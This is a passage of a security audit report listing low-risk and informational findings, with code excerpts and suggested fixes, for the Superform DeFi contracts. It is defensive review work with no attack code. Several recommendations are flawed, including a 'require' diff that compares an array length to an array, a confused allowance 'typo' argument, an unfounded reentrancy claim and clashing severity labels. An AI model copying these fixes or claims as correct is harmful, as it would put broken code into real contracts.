Calling `supportsInterface()` on a contract that doesn't implement the [ERC-165](https://eips.ethereum.org/EIPS/eip-165) standard will result in the call reverting. Even if the caller does support the function, the contract may be malicious and consume all of the transaction's available gas. Call it via a low-level [staticcall(https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f959d7e4e6ee0b022b41e5b644c79369869d8411/contracts/utils/introspection/ERC165Checker.sol#L119)[], with a fixed amount of gas, and check the return code, or use OpenZeppelin's [ERC165Checker.supportsInterface()](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f959d7e4e6ee0b022b41e5b644c79369869d8411/contracts/utils/introspection/ERC165Checker.sol#L36-L39).

*Instances (1)*:

```solidity
File: superform-core/src/SuperformFactory.sol

171:     function addFormImplementation(
172:             address formImplementation_,
173:             uint32 formImplementationId_
174:         )
175:             public
176:             override
177:             onlyProtocolAdmin
178:         {
179:             if (formImplementation_ == address(0)) revert Error.ZERO_ADDRESS();
180:             if (!ERC165Checker.supportsERC165(formImplementation_)) revert Error.ERC165_UNSUPPORTED();
181:             if (formImplementation[formImplementationId_] != address(0)) {
182:                 revert Error.FORM_IMPLEMENTATION_ID_ALREADY_EXISTS();
183:             }
184:             if (!ERC165Checker.supportsInterface(formImplementation_, type(IBaseForm).interfaceId)) {
185:                 revert Error.FORM_INTERFACE_UNSUPPORTED();
186:             }
187:     
188:             /// @dev save the newly added address in the mapping and array registry
189:             formImplementation[formImplementationId_] = formImplementation_;
190:     
191:             formImplementations.push(formImplementation_);
192:     
193:             emit FormImplementationAdded(formImplementation_, formImplementationId_);
194:         }

```

[171-194](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/SuperformFactory.sol#L171-L194)



### Consider to Use `SafeCast` for Casting

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

Casting from larger types to smaller ones can potentially lead to overflows and thus unexpected behavior.

OpenZeppelin's SafeCast library provides functions for safe type conversions, throwing an error whenever an overflow would occur. It is generally recommended to use SafeCast or similar protective measures when performing type conversions to ensure the accuracy of your computations and the security of your contracts.

*Instances (10)*:

```solidity
File: superform-core/src/libraries/DataLib.sol

/// @audit uint256 -> uint8
33:         txType = uint8(txInfo_);

/// @audit uint256 -> uint8
34:         callbackType = uint8(txInfo_ >> 8);

/// @audit uint256 -> uint8
35:         multi = uint8(txInfo_ >> 16);

/// @audit uint256 -> uint8
36:         registryId = uint8(txInfo_ >> 24);

/// @audit uint256 -> uint160
37:         srcSender = address(uint160(txInfo_ >> 32));

/// @audit uint256 -> uint64
38:         srcChainId = uint64(txInfo_ >> 192);

/// @audit uint256 -> uint160
51:         superform_ = address(uint160(superformId_));

/// @audit uint256 -> uint32
52:         formImplementationId_ = uint32(superformId_ >> 160);

/// @audit uint256 -> uint64
53:         chainId_ = uint64(superformId_ >> 192);

/// @audit uint256 -> uint64
76:         chainId_ = uint64(superformId_ >> 192);

```

[33](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L33), [34](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L34), [35](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L35), [36](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L36), [37](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L37), [38](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L38), [51](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L51), [52](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L52), [53](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L53), [76](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/libraries/DataLib.sol#L76)




### Consider implementing two-step procedure for updating protocol addresses

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

A copy-paste error or a typo may end up bricking protocol functionality, or sending tokens to an address with no known private key. Consider implementing a two-step procedure for updating protocol addresses, where the recipient is set as pending, and must 'accept' the assignment by making an affirmative call. A straight forward way of doing this would be to have the target contracts implement [EIP-165](https://eips.ethereum.org/EIPS/eip-165), and to have the 'set' functions ensure that the recipient is of the right interface type.

*Instances (6)*:

```solidity
File: superform-core/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol

96:     function setLzEndpoint(address endpoint_) external onlyProtocolAdmin {
97:            if (endpoint_ == address(0)) revert Error.ZERO_ADDRESS();
98:    
99:            if (address(lzEndpoint) == address(0)) {
100:                lzEndpoint = ILayerZeroEndpoint(endpoint_);
101:                emit EndpointUpdated(address(0), endpoint_);
102:            }
103:        }

```

[96-103](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L96-L103)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol

86:     function setWormholeRelayer(address relayer_) external onlyProtocolAdmin {
87:            if (relayer_ == address(0)) revert Error.ZERO_ADDRESS();
88:            if (address(relayer) == address(0)) {
89:                relayer = IWormholeRelayer(relayer_);
90:                emit WormholeRelayerSet(address(relayer));
91:            }
92:        }

```

[86-92](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/automatic-relayer/WormholeARImplementation.sol#L86-L92)

```solidity
File: superform-core/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol

96:     function setWormholeCore(address wormhole_) external onlyProtocolAdmin {
97:            if (wormhole_ == address(0)) revert Error.ZERO_ADDRESS();
98:            if (address(wormhole) == address(0)) {
99:                wormhole = IWormhole(wormhole_);
100:                emit WormholeCoreSet(address(wormhole));
101:            }
102:        }

106:     function setRelayer(address relayer_) external onlyProtocolAdmin {
107:             if (relayer_ == address(0)) revert Error.ZERO_ADDRESS();
108:             relayer = relayer_;
109:             emit WormholeRelayerSet(address(relayer));
110:         }

```

[96-102](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L96-L102), [106-110](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/wormhole/specialized-relayer/WormholeSRImplementation.sol#L106-L110)

```solidity
File: superform-core/src/settings/SuperRBAC.sol

144:     function setSuperRegistry(address superRegistry_) external override onlyRole(PROTOCOL_ADMIN_ROLE) {
145:             if (address(superRegistry) != address(0)) revert Error.DISABLED();
146:     
147:             if (superRegistry_ == address(0)) revert Error.ZERO_ADDRESS();
148:     
149:             superRegistry = ISuperRegistry(superRegistry_);
150:         }

```

[144-150](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRBAC.sol#L144-L150)

```solidity
File: superform-core/src/settings/SuperRegistry.sol

222:     function setPermit2(address permit2_) external override onlyProtocolAdmin {
223:             if (permit2Address != address(0)) revert Error.DISABLED();
224:             if (permit2_ == address(0)) revert Error.ZERO_ADDRESS();
225:     
226:             permit2Address = permit2_;
227:     
228:             emit SetPermit2(permit2_);
229:         }

```

[222-229](https://github.com/superform-xyz/superform-core/tree/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L222-L229)



### The extra msg.value sent will remain in BroadCastRegistry since it's not validated gasToPay is equal to msg.value

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_



**Description**:

BroadcastRegistry's [_broadcastPayload](https://cantina.xyz/code/2cd0b038-3e32-4db6-b488-0f85b6f0e49f/superform-core/src/crosschain-data/BroadcastRegistry.sol#L144) broadcasts the payload(message_) through individual message bridge implementations.

Accordingly, it uses `gasToPay_` as gas fee. 
However, the `msg.value` is not compared to be equal to `gasToPay_`
It's decoded and used as below;

```solidity
Contract: BroadcastRegistry.sol

100:         (uint256 gasFee, bytes memory extraData) = abi.decode(extraData_, (uint256, bytes));
101: 
102:         _broadcastPayload(srcSender_, ambId_, gasFee, message_, extraData);
```


Other contracts call this function as below;

```solidity
Contract: SuperformFactory.sol

287:         IBroadcastRegistry(superRegistry.getAddress(keccak256("BROADCAST_REGISTRY"))).broadcastPayload{
288:             value: msg.value
289:         }(msg.sender, ambId, message_, broadcastParams);
```

or;
```solidity
Contract: SuperRBAC.sol

214:     /// @dev interacts with role state registry to broadcasting state changes to all connected remote chains
215:     /// @param message_ is the crosschain message to be sent.
216:     /// @param extraData_ is the amb override information.
217:     function _broadcast(bytes memory message_, bytes memory extraData_) internal {
218:         (uint8 ambId, bytes memory broadcastParams) = abi.decode(extraData_, (uint8, bytes));
219:         /// @dev ambIds are validated inside the factory state registry
220:         /// @dev if the broadcastParams are wrong, this will revert in the amb implementation
221:         IBroadcastRegistry(superRegistry.getAddress(keccak256("BROADCAST_REGISTRY"))).broadcastPayload{
222:             value: msg.value
223:         }(msg.sender, ambId, message_, broadcastParams);
224:     }
225: }
```

So the caller loses the extra `msg.value` if it's not equal to `gasToPay_`


**Recommendation**:

Recommend checking the equality.



### User loses assets when `v.amount < dstAmount` in `_processDirectWithdraw`.

**Severity:** Low risk

**Context:** [ERC4626FormImplementation.sol#L293-L293](superform-core/src/forms/ERC4626FormImplementation.sol#L293-L293)

**Description**:
In `_processDirectWithdraw` the `v.amount` is the amount of vault assets that will be swapped for a different token specified by the user. The amount must be less than or equal to `dstAmount` which is the vault assets withdrawn by the user.

In the case that `v.amount` is less than `dstAmount`, the withdrawn assets, that are not swapped, will be lost by the user and will stay in the contract. There are several explanations why a user will set a lower value for `v.amount`, one of which is by accident or if they are expecting a part of the assets to be swapped for another token and the rest to be received as vault assets.

**Recommendation**:
If `v.amount` is less than `dstAmount`, the `_processDirectWithdraw` should transfer the remaining tokens as vault assets instead of keeping them in the contract.



### Difference in array input length can result in unexpected behaviour

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
```mintBatch``` function does not check for array inputs length to be equal for both ```ids_``` and ```amounts_``` which can result in unexpected behaviour when minting id without amount and vice versa.

- Code Reference
https://github.com/superform-xyz/superform-core/blob/main/src/SuperPositions.sol#L151

- Proof of Concept
```mintBatch``` function does not have check for array length of inputs to be of same length which can result in minting with difference in length existing between parameters.
```
    function mintBatch(
        address srcSender_,
        uint256[] memory ids_,
        uint256[] memory amounts_
    )
        external
        override
        onlyBatchMinter(ids_)
    {
        _batchMint(srcSender_, msg.sender, ids_, amounts_, "");
    }
```

- Tools Used
Manual Review

- Recommended Mitigation Steps
The recommendation is made to check for lengths of array inputs to avoid difference that can lead to unforeseen situation.
```diff
    function mintBatch(
        address srcSender_,
        uint256[] memory ids_,
        uint256[] memory amounts_
    )
        external
        override
        onlyBatchMinter(ids_)
    {
+	require(ids_.length == amounts_, "Array length differs");
        _batchMint(srcSender_, msg.sender, ids_, amounts_, "");
    }
```




### batchProcessTx function does not have empty array check which can result in unexpected outcome 

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
Some transactions will process without any data inside when empty array will be passed inside ```_processTx``` that will result in certain unexpected behaviour.

- Proof of Concept
```batchProcessTx``` have method to process transaction which are carried out without any sanity check that can lead to unexpected behaviour.
```
    function batchProcessTx(
        uint256 payloadId_,
        uint256[] calldata indices,
        uint8[] calldata bridgeIds_,
        bytes[] calldata txData_
    )
        external
        override
        onlySwapper
        nonReentrant
    {
        IBaseStateRegistry coreStateRegistry = _getCoreStateRegistry();
        _isValidPayloadId(payloadId_, coreStateRegistry);
        (,, uint8 multi,,,) = DataLib.decodeTxInfo(coreStateRegistry.payloadHeader(payloadId_));
        if (multi != 1) revert Error.INVALID_PAYLOAD_TYPE();

        InitMultiVaultData memory data = abi.decode(coreStateRegistry.payloadBody(payloadId_), (InitMultiVaultData));

        uint256 len = txData_.length;
        for (uint256 i; i < len; ++i) {
            _processTx(
                payloadId_, indices[i], bridgeIds_[i], txData_[i], data.liqData[i].interimToken, coreStateRegistry
            );
        }
    }
```

- Code Reference
https://github.com/superform-xyz/superform-core/blob/main/src/crosschain-liquidity/DstSwapper.sol#L161

- Tools Used
Manual Review

- Recommended Mitigation Steps
The recommendation is made for having require condition that checks empty array is not passed as input to the function.

```diff
    function batchProcessTx(
        uint256 payloadId_,
        uint256[] calldata indices,
        uint8[] calldata bridgeIds_,
        bytes[] calldata txData_
    )
        external
        override
        onlySwapper
        nonReentrant
    {
+	require(indices.length > 0, " indices array does not have any data");
+	require(bridgeIds_.length > 0, "bridgeIds array does not have any data");
+	require(txData_.length > 0, " txData array does not have any data");

        IBaseStateRegistry coreStateRegistry = _getCoreStateRegistry();
        _isValidPayloadId(payloadId_, coreStateRegistry);
        (,, uint8 multi,,,) = DataLib.decodeTxInfo(coreStateRegistry.payloadHeader(payloadId_));
        if (multi != 1) revert Error.INVALID_PAYLOAD_TYPE();
        InitMultiVaultData memory data = abi.decode(coreStateRegistry.payloadBody(payloadId_), (InitMultiVaultData));
        uint256 len = txData_.length;
        for (uint256 i; i < len; ++i) {
            _processTx(
                payloadId_, indices[i], bridgeIds_[i], txData_[i], data.liqData[i].interimToken, coreStateRegistry
            );
        }
    } 
``` 




### Change setAmbAddress  and setStateRegistryAddress validation to Prevent Inconsistent Mapping States

**Severity:** Low risk

**Context:** [SuperRegistry.sol#L309-L309](superform-core/src/settings/SuperRegistry.sol#L309-L309)

In the SuperRegistry's setAmbAddress function. There is no need to have the second check || ambIds[ambAddress] != 0 because there will not be a case where the ambAddresses[ambId] is not address(0) but the ambIds[ambAddress] is 0, also if you always expect the ambIds[ambAddress] to be != 0 if once set jsut add a check like the ambAddress.

Current implementation allows

```
ambAddresses[ambId] = NOT ZERO;
ambIds[ambAddress] = 0;
```

Which can lead to unexpected behaviour.
And the values can't be re-set.

I suggest changes like:

```
function setAmbAddress(
        uint8[] memory ambId_,
        address[] memory ambAddress_,
        bool[] memory isBroadcastAMB_
    )
        external
        override
        onlyProtocolAdmin
    {
        uint256 len = ambId_.length;
        if (len != ambAddress_.length || len != isBroadcastAMB_.length) revert Error.ARRAY_LENGTH_MISMATCH();

        for (uint256 i; i < len; ++i) {
            address ambAddress = ambAddress_[i];
            uint8 ambId = ambId_[i];
            bool broadcastAMB = isBroadcastAMB_[i];
            if (ambAddress == address(0) || ambId == 0) revert Error.ZERO_ADDRESS();
            if (ambAddresses[ambId] != address(0)) revert Error.DISABLED();

            ambAddresses[ambId] = ambAddress;
            ambIds[ambAddress] = ambId;
            isBroadcastAMB[ambId] = broadcastAMB;
            emit SetAmbAddress(ambId, ambAddress, broadcastAMB);
        }
    }

```

Note that that we revert if the ambId == 0 and I have removed the unneeded second operand of the || in if (ambAddresses[ambId] != address(0) ..., another approach could be to change the || to && just like this:

if (ambAddresses[ambId] != address(0) && ambIds[ambAddress] != 0) revert Error.DISABLED();


Similar observations on setStateRegistryAddress of the same SuperRegistry contract.



### The storage slots/hashes have known pre-images.

**Severity:** Low risk

**Context:** [SuperformFactory.sol#L32-L32](superform-core/src/SuperformFactory.sol#L32-L32), [SuperformFactory.sol#L65-L65](superform-core/src/SuperformFactory.sol#L65-L65)

**Description**: The storage slots/hashes have known pre-images.

**Recommendation**: It might be best to decrement them by one so that finding the pre-image would be harder. Further read on https://github.com/ethereum/EIPs/pull/1967



## Informational risk
### Typo mistake

**Severity:** Informational

**Context:** [ERC1155A.sol#L47-L47](ERC1155A/src/ERC1155A.sol#L47-L47)

**Description**:  The condition should be `singleApproved >= transferAmount` instead of `singleApproved > transferAmount`. This is because the allowance should only be reduced if the transfer amount is less than or equal to the allowance. If the transfer amount is greater than the allowance, then the transfer should not be allowed.



**Recommendation**: 
```
/// @dev If caller singleApproved >= transferAmount, function executes and reduces allowance
``



### Users lose their approvals when transmuting back to ERC1155A

**Severity:** Informational

**Context:** [ERC1155A.sol#L285-L303](ERC1155A/src/ERC1155A.sol#L285-L303)

- Description
Each ERC1155 id can be linked to an aERC20 token. Then the owner of a certain ERC1155 token or any approved party can burn this ERC1155 token and mint an aERC20 token to the owner, i.e transmute. When an approved account transmutes to aERC20, their allowance is decreased.

There are also functions that allow the opposite - burn aERC20 token to mint ERC1155 token. The problem is that when an approved party transmutes back to ERC1155 token, their allowance is not increased. Now they will not be able to use the tokens.

- Recommendation
Increase the allowance of the operator after transmuting back to ERC1155.



### Could use a constant value instead of a literal value

**Severity:** Informational

**Context:** [BaseRouterImplementation.sol#L104-L104](superform-core/src/BaseRouterImplementation.sol#L104-L104)

Could use `superRegistry.SUPERFORM_FACTORY()` instead of `keccak256("SUPERFORM_FACTORY")` to improve code consistency.



### BaseForm's initialize documentation tricks the developer into thinking he will be admin of the contract

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:
The `initialize()` function documentation states that the caller of the function will be set as the admin of the contract.
The code of the function does not implement such logic.

This could trick the developer into thinking that he will have admin capabilities over the contract, which is not possible.
This documentation mistake can have high impact on the protocol as the critical SuperForm contract inherits from BaseForm.

The impacted scope is: https://github.com/superform-xyz/superform-core/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/BaseForm.sol#L163

**Recommendation**:
Fix the documentation at https://github.com/superform-xyz/superform-core/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/BaseForm.sol#L163.



### BaseForm's initialize documentation lacks a parameter

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

**Description**:
The `asset_` parameter of BaseForm's `initialize()` function is not documented in the NatSpec comments.

Impacted scope: https://github.com/superform-xyz/superform-core/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/BaseForm.sol#L162

**Recommendation**:
Add the `asset_` to the NatSpec documentation.



### Hardcoded ERC165 Interface IDs in `supportsInterface` Function

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Severity
Informational

- Relevant GitHub Links
https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L368-L371

- Summary
The `supportsInterface` function in the `ERC1155A` contract contains hardcoded values for ERC165 interface IDs. While this implementation is functional, it introduces a potential maintenance risk, as any changes to the ERC165 standard may not be reflected in this hardcoded list.

- Vulnerability Details
The function uses hardcoded values (`0x01ffc9a7`, `0xd9b67a26`, and `0x0e89341c`) to check for support of ERC165, ERC1155, and ERC1155MetadataURI interfaces, respectively. Hardcoding these values may result in future compatibility issues if the ERC165 standard or related standards are updated.

- Impact
The impact of this issue is low. The hardcoded values are functional for the current state of ERC165 and ERC1155 standards. However, there is a risk of potential future issues if the standards evolve, and these values are not updated accordingly.

- Tools Used
- Manual Review

- Recommendations
It is recommended to dynamically generate the interface IDs using the `type` keyword or other appropriate methods instead of hardcoding them. This approach ensures that the function remains compatible with any future changes to the ERC165 standard or related standards.

Example:

```solidity
function supportsInterface(bytes4 interfaceId) public view virtual returns (bool) {
    return interfaceId == type(IERC165).interfaceId
        || interfaceId == type(IERC1155).interfaceId
        || interfaceId == type(IERC1155MetadataURI).interfaceId;
}
```

By using the `type` keyword, the interface IDs are generated at compile time, providing a more robust and future-proof solution. This approach aligns with best practices for ensuring contract compatibility with evolving standards.



### Missing Zero Amount Check in `_dispatchTokens` Function

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- **Severity**

Medium

- **Relevant GitHub Links**
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/LiquidityHandler.sol#L33-L57

- **Summary**

In the SuperformRouter.sol contract there is a potential security issue related to the lack of a zero amount check in the `_dispatchTokens` function. The function allows operations to proceed even when the `amount_` parameter is zero, which may lead to unnecessary state changes, increased gas consumption, and potential vulnerabilities.

- **Vulnerability Details**

The primary vulnerability identified is the absence of a check for a zero amount in the `_dispatchTokens` function. The specific areas of concern include:

1. **Unnecessary Allowance Increase:**
   - The function does not check whether the `amount_` is zero before attempting to increase the allowance using `safeIncreaseAllowance`. This could lead to unnecessary state changes when `amount_` is zero.

2. **Potential Reentrancy Attacks:**
   - Allowing the function to be called with a zero amount may expose the contract to reentrancy attacks. Attackers could manipulate the contract state by repeatedly calling the function with a zero amount.

3. **Unexpected Behavior and Gas Consumption:**
   - Allowing zero amounts without proper checks may lead to unexpected behavior and increased gas consumption, potentially impacting the efficiency of the contract.

- **Impact**

The identified vulnerabilities may have the following impact:

- Unnecessary blockchain state changes.
- Increased gas costs for users and the contract owner.
- Potential exposure to reentrancy attacks, disrupting the normal operation of the contract.
- Unexpected behavior and logic flaws in the contract.

- **Tools Used**

- Manual Review

- **Recommendations**

To address the identified security issues, we recommend the following:

 **Add Explicit Zero Amount Check:**
   - Implement an explicit check at the beginning of the `_dispatchTokens` function to ensure that the `amount_` parameter is not zero. This will prevent unnecessary operations and state changes.

```solidity
function _dispatchTokens(
    address bridge_,
    bytes memory txData_,
    address token_,
    uint256 amount_,
    uint256 nativeAmount_
)
    internal
    virtual
{
    if (amount_ == 0) {
        revert Error.ZERO_AMOUNT();
    }

    // ... rest of the function
}
```






### Inconsistency in Variable Naming and Comments in LiFiValidator's decodeAmountIn Function

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Severity

Informational

- Relevant GitHub Links

https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/lifi/LiFiValidator.sol#L121-L149

- Summary

In the `decodeAmountIn` function of the `LiFiValidator` contract, there is a discrepancy between the comment and the actual variable name returned from the function. The comment mentions "amountIn," while the variable returned is named "amount_."

- Vulnerability Details

The inconsistency in variable naming and comments can lead to confusion and misunderstandings for developers or reviewers. It doesn't pose a direct security threat but may result in code readability issues.

- Impact

- Reduced code readability and potential confusion for developers.

- Tools Used

- Manual review

- Recommendations

Update the comment in the `decodeAmountIn` function to mention "amount_" instead of "amountIn" to maintain consistency between comments and code. Alternatively, consider renaming the variable to "amountIn" if it better reflects the intended meaning.

This change will enhance code clarity and make it more understandable for anyone reviewing or maintaining the code.



### Code Readability Enhancement - Use of Named Constants in DstSwapper Contract

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Severity
Informational

- Relevant GitHub Links
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/DstSwapper.sol#L353

- Summary
The code currently utilizes numeric literals (magic numbers) such as `10_000` without named constants.

- Vulnerability Details
The code contains numeric literals without using named constants. For example, the value `10_000` is used without clear context. While this does not pose a direct security risk, it can impact code readability and maintainability over time.

- Impact
The absence of named constants for numeric literals may result in decreased code readability and make it challenging for developers to understand the significance of these values. It does not directly impact the security of the contract.

- Tools Used
- Manual Review

- Recommendations

- 1. Named Constants
Consider replacing numeric literals, such as `10_000`, with named constants. This practice enhances code readability and provides meaningful context for the purpose of specific values. For instance, defining `SLIPPAGE_THRESHOLD` with the value `10_000` would improve the clarity of the code.

For example:
```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.23;

contract DstSwapper {
    uint256 private constant SLIPPAGE_THRESHOLD = 10_000;
    // Other contract code...
}

if (v.balanceDiff < ((v.expAmount * (SLIPPAGE_THRESHOLD - v.maxSlippage)) / SLIPPAGE_THRESHOLD)) {
    revert Error.SLIPPAGE_OUT_OF_BOUNDS();
}
```



### Add proper comments to `decodeSwapOutputToken` function

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- **Severity:** Informational

- Relevant GitHub Links: 
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/socket/SocketValidator.sol#L97-L99

- **Summary:**
The `SocketValidator` contract exhibits a minor issue related to the documentation of the `decodeSwapOutputToken` function. The function includes a revert statement with a specific error message, which may be intentional for interface enforcement. However, adding a comment to explain the purpose of the revert statement would enhance clarity for developers.

- **Vulnerability Details:**
The `decodeSwapOutputToken` function contains a revert statement with a specific error message (`Error.CANNOT_DECODE_FINAL_SWAP_OUTPUT_TOKEN()`). While this could be an intentional part of the interface, adding a comment would help developers understand the purpose of the revert statement and guide them on the expected behavior.

- **Impact:**
This informational issue has no direct impact on the security of the contract. It is a suggestion for improved documentation to enhance code readability and provide guidance to developers implementing the interface.

- **Tools Used:**
- Manual review

- **Recommendations:**
It is recommended to add a comment to the `decodeSwapOutputToken` function to explain the purpose of the revert statement and guide developers on the expected behavior. This will contribute to a more transparent and developer-friendly codebase.

Example:
```solidity
/// @notice To be implemented by contracts that handle the decoding of the final swap output token.
/// @dev Implementers should replace the revert statement with the appropriate logic for decoding the output token.
function decodeSwapOutputToken(bytes calldata /*txData_*/) external pure returns (address /*token_*/);
```





### Misplacement of `validateSlippage` Function in Internal Section

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


- Severity
INFORMATIONAL

- Relevant GitHub Links
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/extensions/CoreStateRegistry.sol#L490-L497

- Summary
The `validateSlippage` function is categorized as a public view function but is currently placed within the internal functions section. This discrepancy may lead to confusion and impacts the code's readability and maintainability.

- Vulnerability Details
The issue arises from the misplacement of the `validateSlippage` function in the internal functions section instead of the public functions section. As a result, external developers reviewing the code may find it challenging to locate and understand the purpose of this publicly accessible function.

- Impact
The impact of this issue is primarily related to code organization, readability, and developer experience. It does not introduce a security vulnerability but could lead to confusion and hinder effective code comprehension.

- Tools Used
- Manual review

- Recommendations
Move the `validateSlippage` function to the public functions section to align its visibility with its intended usage as a publicly accessible view function. This adjustment improves code organization and contributes to a more straightforward and understandable codebase.





### setVaultLimitPerTx has no validation check for the zero value of `chainId_`

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_

- Severity
**Informational**

- Relevant GitHub Links
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/settings/SuperRegistry.sol#L232-L239

- Summary
The `setVaultLimitPerTx` function in the `SuperRegistry` lacks a validation check for the zero value of `chainId_`. This could potentially allow the function to be unintentionally called with an invalid or zero chain identifier.

- Vulnerability Details
The function does not include a check to ensure that `chainId_` is a valid and non-zero value.

- Impact
The absence of this validation check poses a low-risk vulnerability. If the function is mistakenly called with `chainId_` set to zero, it could result in unexpected behavior and may not conform to the intended usage of the function.

- Tools Used
- Manual review

- Recommendations
It is recommended to add a validation check at the beginning of the `setVaultLimitPerTx` function to ensure that `chainId_` is a valid and non-zero value. This can be done with the following code snippet:

```solidity
if (chainId_ == 0) {
    revert Error.ZERO_INPUT_VALUE("Chain ID cannot be zero");
}
```

This check will help prevent accidental or malicious attempts to set the `vaultLimitPerTx` with an invalid or zero chain identifier, adding an extra layer of security to the contract.





### No checks the allowance before transfer from router

**Severity:** Informational

**Context:** [ERC4626FormImplementation.sol#L259-L259](superform-core/src/forms/ERC4626FormImplementation.sol#L259-L259)

**Description**:

Before the `_processXChainDeposit` function is executed,No checks the allowance before transfer from router

```
    function _processXChainDeposit(
        InitSingleVaultData memory singleVaultData_,
        uint64 srcChainId_
    )
        internal
        returns (uint256 dstAmount)
    {
        (,, uint64 dstChainId) = singleVaultData_.superformId.getSuperform();
        address vaultLoc = vault;

        IERC4626 v = IERC4626(vaultLoc);

        /// @dev pulling from sender, to auto-send tokens back in case of failed deposits / reverts 
        IERC20(asset).safeTransferFrom(msg.sender, address(this), singleVaultData_.amount);
```



**Recommendation**:

It should be similar to the writing method in `_processXChainDeposit`



### Absence of UnsetTrustedRemote Functionality in `LayerzeroImplementation` Can Lead to Persistent Security Risks

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


- Severity
**Medium**

- Relevant GitHub Links
https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-data/adapters/layerzero/LayerzeroImplementation.sol#L149-L152

- Summary
The `LayerzeroImplementation` lacks a function to unset or update the trusted contract address once it has been set using the `setTrustedRemote` function. This limitation may pose operational challenges and reduce the protocol's adaptability.

- Vulnerability Details
The absence of an unsetting the trusted remote functionality means that once a contract is set as trusted, it cannot be unset or updated. This could lead to potential security and operational issues if the trusted contract becomes compromised or needs to be deprecated.

- Impact
1. **Lack of Flexibility:** The protocol lacks flexibility in updating or changing the trusted contract address.
2. **Security Concerns:** Compromised or deprecated trusted contracts cannot be disabled, potentially leading to security vulnerabilities.
3. **Operational Challenges:** Managing changes to the trusted contract may require complex workarounds or deployment of new contracts.
4. **Upgradeability Limitations:** Upgrades involving changes to the trusted contract may be challenging to implement.
5. **Reduced Control:** Administrators have limited control over the configuration of trusted contracts.

- POC

1. The administrator sets a trusted remote contract using the `setTrustedRemote` function to receive messages.

2. The initially trusted remote contract becomes compromised or malicious.

3. Due to the absence of an `unsetTrustedRemote` function, the administrator cannot update or unset the compromised trusted remote contract.

4. The compromised contract retains its status as the trusted remote, continuing to receive messages.

5. Security vulnerabilities may arise from the compromised nature of the contract, as it maintains access to incoming messages.

6. Administrators have limited control over the configuration of trusted contracts, lacking the ability to address security concerns effectively.

